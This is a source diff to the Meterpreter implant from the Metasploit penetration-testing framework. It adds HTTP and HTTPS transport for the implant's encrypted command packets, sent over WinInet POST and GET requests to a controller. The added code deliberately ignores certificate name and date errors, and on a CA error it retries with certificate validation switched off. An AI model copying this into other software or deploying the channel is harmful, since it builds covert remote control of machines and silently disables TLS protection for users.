@@ -878,6 +878,20 @@ DWORD packet_remove_completion_handler(LPCSTR requestId)
  */
 DWORD packet_transmit(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
 {
+	if (remote->transport == METERPRETER_TRANSPORT_SSL) {
+		return packet_transmit_via_ssl(remote, packet, completion);
+	}
+	if (remote->transport == METERPRETER_TRANSPORT_HTTP || remote->transport == METERPRETER_TRANSPORT_HTTPS) {
+		return packet_transmit_via_http(remote, packet, completion);
+	}
+	return 0;
+}
+
+/*
+ * Transmit and destroy a packet over SSL
+ */
+DWORD packet_transmit_via_ssl(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
+{
 	CryptoContext *crypto;
 	Tlv requestId;
 	DWORD res;
@@ -896,13 +910,10 @@ DWORD packet_transmit(Remote *remote, Packet *packet, PacketRequestCompletion *c
 
 		rid[sizeof(rid) - 1] = 0;
 
-		for (index = 0; 
-		     index < sizeof(rid) - 1; 
-		     index++)
+		for (index = 0; index < sizeof(rid) - 1; index++)
 			rid[index] = (rand() % 0x5e) + 0x21;
 
-		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID,
-				rid);
+		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
 	}
 
 	do
@@ -993,6 +1004,154 @@ DWORD packet_transmit(Remote *remote, Packet *packet, PacketRequestCompletion *c
 	return res;
 }
 
+
+
+/*
+ * Transmit and destroy a packet over HTTP(S)
+ */
+DWORD packet_transmit_via_http(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
+{
+	CryptoContext *crypto;
+	Tlv requestId;
+	DWORD res;
+#ifdef _UNIX
+	int local_error = -1;
+#endif
+
+
+
+	dprintf("Calling packet_transmit_via_http()...");
+
+	lock_acquire( remote->lock );
+
+	// If the packet does not already have a request identifier, create one for it
+	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,&requestId) != ERROR_SUCCESS)
+	{
+		DWORD index;
+		CHAR rid[32];
+
+		rid[sizeof(rid) - 1] = 0;
+
+		for (index = 0; index < sizeof(rid) - 1; index++)
+			rid[index] = (rand() % 0x5e) + 0x21;
+
+		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
+	}
+
+	do
+	{
+		// If a completion routine was supplied and the packet has a request 
+		// identifier, insert the completion routine into the list
+		if ((completion) &&
+		    (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
+				&requestId) == ERROR_SUCCESS))
+			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
+
+		// If the endpoint has a cipher established and this is not a plaintext
+		// packet, we encrypt
+		if ((crypto = remote_get_cipher(remote)) &&
+		    (packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
+		    (packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
+		{
+			ULONG origPayloadLength = packet->payloadLength;
+			PUCHAR origPayload = packet->payload;
+
+			// Encrypt
+			if ((res = crypto->handlers.encrypt(crypto, packet->payload, 
+					packet->payloadLength, &packet->payload, 
+					&packet->payloadLength)) !=
+					ERROR_SUCCESS)
+			{
+				SetLastError(res);
+				break;
+			}
+
+			// Destroy the original payload as we no longer need it
+			free(origPayload);
+
+			// Update the header length
+			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
+		}
+
+#ifdef _WIN32
+		dprintf("Transmitting packet of length %d to remote", packet->payloadLength);
+		res = packet_transmit_via_http_wininet(remote, packet, completion);
+#else
+		// XXX: Implement non-windows HTTP delivery
+#endif
+
+		if(res < 0) {
+			dprintf("[PACKET] transmit failed with return %d\n", res);
+			break;
+		}
+
+		SetLastError(ERROR_SUCCESS);
+	} while (0);
+
+	res = GetLastError();
+
+	// Destroy the packet
+	packet_destroy(packet);
+
+	lock_release( remote->lock );
+
+	return res;
+}
+
+
+/*
+ * Transmit and destroy a packet over HTTP(S)
+ */
+#ifdef _WIN32
+DWORD packet_transmit_via_http_wininet(Remote *remote, Packet *packet, PacketRequestCompletion *completion) {
+	DWORD res = 0;
+	HINTERNET hReq;
+	HINTERNET hRes;
+	DWORD retries = 5;
+	DWORD flags;
+	unsigned char *buffer;
+
+	buffer = malloc( packet->payloadLength + sizeof(TlvHeader) );
+	if (! buffer) {
+		SetLastError(ERROR_NOT_FOUND);
+		return 0;
+	}
+
+	memcpy(buffer, &packet->header, sizeof(TlvHeader));
+	memcpy(buffer + sizeof(TlvHeader), packet->payload, packet->payloadLength);
+
+	do {
+
+		flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI;
+		if (remote->transport == METERPRETER_TRANSPORT_HTTPS) {
+			flags |= INTERNET_FLAG_SECURE |  INTERNET_FLAG_IGNORE_CERT_CN_INVALID  | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
+		}
+
+		hReq = HttpOpenRequest(remote->hConnection, "POST", remote->uri, NULL, NULL, NULL, flags, 0);
+		if (hReq == NULL) {			dprintf("[PACKET RECEIVE] Failed HttpOpenRequest: %d", GetLastError());			SetLastError(ERROR_NOT_FOUND);			break;		}
+retry_request:
+		hRes = HttpSendRequest(hReq, NULL, 0, buffer, packet->payloadLength + sizeof(TlvHeader) );
+		if (hRes == NULL && GetLastError() == ERROR_INTERNET_INVALID_CA && retries > 0) {
+			retries--;
+			flags = 0x3380;
+			InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, 4);
+			goto retry_request;
+		}
+
+		if (! hRes) {
+			dprintf("[PACKET RECEIVE] Failed HttpSendRequest: %d", GetLastError());
+			SetLastError(ERROR_NOT_FOUND);
+			break;
+		}
+	} while(0);
+
+	memset(buffer, 0, packet->payloadLength + sizeof(TlvHeader));
+	InternetCloseHandle(hReq);
+	return res;
+}
+
+#endif
+
 /*
  * Transmits a response with nothing other than a result code in it
  */
@@ -1027,6 +1186,11 @@ DWORD packet_receive(Remote *remote, Packet **packet)
 #ifdef _UNIX
 	int local_error = -1;
 #endif
+
+	
+	if (remote->transport == METERPRETER_TRANSPORT_HTTP || remote->transport == METERPRETER_TRANSPORT_HTTPS)
+		return packet_receive_via_http(remote, packet);
+	
 	
 	lock_acquire( remote->lock );
 
@@ -1155,3 +1319,199 @@ DWORD packet_receive(Remote *remote, Packet **packet)
 	return res;
 }
 
+
+#ifdef _WIN32
+/*
+ * Receive a new packet over HTTP using WinInet
+ */
+DWORD packet_receive_http_via_wininet(Remote *remote, Packet **packet) {
+
+	DWORD headerBytes = 0, payloadBytesLeft = 0, res; 
+	CryptoContext *crypto = NULL;
+	Packet *localPacket = NULL;
+	TlvHeader header;
+	LONG bytesRead;
+	BOOL inHeader = TRUE;
+	PUCHAR payload = NULL;
+	ULONG payloadLength;
+	DWORD flags;
+
+	HINTERNET hReq;
+	HINTERNET hRes;
+	DWORD retries = 5;
+	
+	lock_acquire( remote->lock );
+
+	do {
+
+		flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI;
+		if (remote->transport == METERPRETER_TRANSPORT_HTTPS) {
+			flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
+		}
+
+		hReq = HttpOpenRequest(remote->hConnection, "GET", remote->uri, NULL, NULL, NULL, flags, 0);
+		if (hReq == NULL) {			dprintf("[PACKET RECEIVE] Failed HttpOpenRequest: %d", GetLastError());			SetLastError(ERROR_NOT_FOUND);			break;		}
+retry_request:
+		hRes = HttpSendRequest(hReq, NULL, 0, "RECV", 4);
+		dprintf("[RECEIVE] Got HTTP Reply: 0x%.8x", hRes);	
+		if (hRes == NULL && GetLastError() == ERROR_INTERNET_INVALID_CA && retries > 0) {
+			retries--;
+			flags = 0x3380;
+			InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &flags, 4);
+			goto retry_request;
+		}
+
+		if (! hRes) {
+			dprintf("[PACKET RECEIVE] Failed HttpSendRequest: %d", GetLastError());
+			SetLastError(ERROR_NOT_FOUND);
+			break;
+		}
+
+		// Read the packet length
+		retries = 3;
+		while (inHeader && retries > 0)
+		{
+			retries--;
+
+			if (! InternetReadFile(hReq, ((PUCHAR)&header + headerBytes), sizeof(TlvHeader) - headerBytes, &bytesRead))  {
+				dprintf("[PACKET RECEIVE] Failed HEADER InternetReadFile: %d", GetLastError());
+				SetLastError(ERROR_NOT_FOUND);
+				break;
+			}
+
+			headerBytes += bytesRead;
+	
+			if (headerBytes != sizeof(TlvHeader)) {
+				if (bytesRead == 0) {
+					SetLastError(ERROR_NOT_FOUND);
+					break;
+				}
+				continue;
+			} else {
+				inHeader = FALSE;
+			}
+		}
+		
+		if (headerBytes != sizeof(TlvHeader)) {
+			SetLastError(ERROR_NOT_FOUND);
+			break;
+		}
+
+		// Initialize the header
+		header.length    = header.length;
+		header.type      = header.type;
+		payloadLength    = ntohl(header.length) - sizeof(TlvHeader);
+		payloadBytesLeft = payloadLength;
+
+		// Allocate the payload
+		if (!(payload = (PUCHAR)malloc(payloadLength)))
+		{
+			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+			break;
+		}
+			
+		// Read the payload
+		retries = payloadBytesLeft;
+		while (payloadBytesLeft > 0 && retries > 0 )
+		{
+			retries--;
+
+			if (! InternetReadFile(hReq, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, &bytesRead))  {
+				dprintf("[PACKET RECEIVE] Failed BODY InternetReadFile: %d", GetLastError());
+				SetLastError(ERROR_NOT_FOUND);
+				break;
+			}
+
+			if (!bytesRead) {
+				SetLastError(ERROR_NOT_FOUND);
+				break;
+			}
+
+			payloadBytesLeft -= bytesRead;
+		}
+		
+		// Didn't finish?
+		if (payloadBytesLeft)
+			break;
+
+		// Allocate a packet structure
+		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
+		{
+			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+			break;
+		}
+
+		memset( localPacket, 0, sizeof(Packet) );
+
+		// If the connection has an established cipher and this packet is not
+		// plaintext, decrypt
+		if ((crypto = remote_get_cipher(remote)) &&
+		    (packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
+		    (packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
+		{
+			ULONG origPayloadLength = payloadLength;
+			PUCHAR origPayload = payload;
+
+			// Decrypt
+			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength,&payload, &payloadLength)) != ERROR_SUCCESS)
+			{
+				SetLastError(res);
+				break;
+			}
+
+			// We no longer need the encrypted payload
+			free(origPayload);
+		}
+
+		localPacket->header.length = header.length;
+		localPacket->header.type   = header.type;
+		localPacket->payload       = payload;
+		localPacket->payloadLength = payloadLength;
+
+		*packet = localPacket;
+
+		SetLastError(ERROR_SUCCESS);
+
+	} while (0);
+
+	res = GetLastError();
+
+	// Cleanup on failure
+	if (res != ERROR_SUCCESS)
+	{
+		if (payload)
+			free(payload);
+		if (localPacket)
+			free(localPacket);
+	}
+
+	if (hReq) 
+		InternetCloseHandle(hReq);
+
+	lock_release( remote->lock );
+
+	return res;
+}
+
+#endif
+
+
+
+/*
+ * Receive a new packet over HTTP
+ */
+#ifdef _WIN32
+
+DWORD packet_receive_via_http(Remote *remote, Packet **packet)
+{
+	return packet_receive_http_via_wininet(remote, packet);
+}
+
+#else
+
+DWORD packet_receive_via_http(Remote *remote, Packet **packet)
+{
+	return 0;
+}
+
+#endif
